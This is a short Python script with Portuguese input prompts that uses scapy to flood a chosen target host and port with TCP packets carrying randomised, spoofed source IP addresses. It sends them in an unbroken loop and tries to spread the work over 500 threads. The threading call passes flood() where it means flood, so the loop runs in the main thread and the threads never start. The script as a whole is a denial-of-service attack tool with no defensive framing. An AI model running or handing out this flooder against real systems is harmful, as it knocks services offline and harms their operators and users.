from scapy.all import *
import threading

target = input("[+] Entre com o alvo: ")
port = int(input("[+] Entre com a porta: "))

def flood():
    packet = IP(src=RandIP(), dst=target) / TCP(dport=port)
    send(packet, loop=1, inter=0, verbose=1)

for p in range(500):
    threading.Thread(target=flood()).start()